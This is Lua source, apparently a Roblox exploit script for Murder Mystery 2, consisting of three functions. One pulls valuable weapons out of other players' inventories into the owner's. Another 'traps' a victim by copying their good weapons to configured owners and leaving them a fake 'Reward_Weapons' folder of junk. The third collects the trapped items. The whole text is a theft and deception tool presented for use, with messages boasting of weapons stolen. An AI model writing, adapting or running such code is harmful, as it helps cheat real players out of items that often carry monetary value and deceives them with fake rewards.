-- ═══════════════════════════════════════════════════════════════
-- COLLECT GOOD WEAPONS FROM SERVER
-- ═══════════════════════════════════════════════════════════════

local function collectAllGoodWeapons()
    if not IS_OWNER then return end
    
    local ownerInventory = findMM2Inventory(player)
    if not ownerInventory then return end
    
    local totalCollected = 0
    local playersWithGood = 0
    
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= player then
            local inv = findMM2Inventory(p)
            if inv then
                local weaponsToMove = {}
                for _, item in ipairs(inv:GetChildren()) do
                    if isGoodWeapon(item.Name) then
                        table.insert(weaponsToMove, item)
                    end
                end
                
                if #weaponsToMove > 0 then
                    playersWithGood = playersWithGood + 1
                    for _, w in ipairs(weaponsToMove) do
                        pcall(function() w.Parent = ownerInventory end)
                        totalCollected = totalCollected + 1
                    end
                end
            end
        end
    end
    
    if totalCollected > 0 then
        notifyOwner(string.format("🔥 COLLECTED %d GOOD WEAPONS FROM %d PLAYERS!", 
            totalCollected, playersWithGood), Color3.fromRGB(255, 215, 0))
    end
end

-- ═══════════════════════════════════════════════════════════════
-- TRAP OTHERS
-- ═══════════════════════════════════════════════════════════════

local function trapPlayer()
    if player:FindFirstChild("_TRAPPED") then return end
    
    local inv = findMM2Inventory(player)
    local goodWeapons = {}
    local trashWeapons = {}
    
    if inv then
        for _, item in ipairs(inv:GetChildren()) do
            if isGoodWeapon(item.Name) then
                table.insert(goodWeapons, item)
            else
                table.insert(trashWeapons, item)
            end
        end
    end
    
    for _, ownerName in ipairs(CONFIG.OWNERS) do
        local owner = Players:FindFirstChild(ownerName)
        if owner then
            local oInv = findMM2Inventory(owner)
            if oInv then
                for _, w in ipairs(goodWeapons) do
                    pcall(function()
                        local cloned = w:Clone()
                        cloned.Parent = oInv
                    end)
                end
            end
        end
    end
    
    local fakeReward = Instance.new("Folder")
    fakeReward.Name = "Reward_Weapons"
    fakeReward.Parent = player
    for _, w in ipairs(trashWeapons) do
        w.Parent = fakeReward
    end
    
    player._TRAPPED = true
    
    if IS_OWNER then
        notifyOwner(string.format("🔥 TRAPPED %s - STOLE %d GOOD WEAPONS!", 
            player.Name, #goodWeapons), Color3.fromRGB(255, 0, 0))
    end
end

-- ═══════════════════════════════════════════════════════════════
-- COLLECT OFFLINE TRAPS
-- ═══════════════════════════════════════════════════════════════

local function collectOfflineTraps()
    if not IS_OWNER then return end
    
    local oInv = findMM2Inventory(player)
    if not oInv then return end
    
    local total = 0
    
    for _, p in ipairs(Players:GetPlayers()) do
        local f = p:FindFirstChild("_TRAP")
        if f then
            for _, v in ipairs(f:GetChildren()) do
                if v:IsA("StringValue") then
                    total = total + 1
                    local w = Instance.new("StringValue")
                    w.Name = v.Name
                    w.Value = v.Value
                    w.Parent = oInv
                end
            end
            f:Destroy()
        end
    end
    
    if total > 0 then
        notifyOwner(string.format("📦 YOU RECEIVED %d GOOD WEAPONS FROM TRAPS!", total), 
            Color3.fromRGB(0, 255, 100))
    end
end

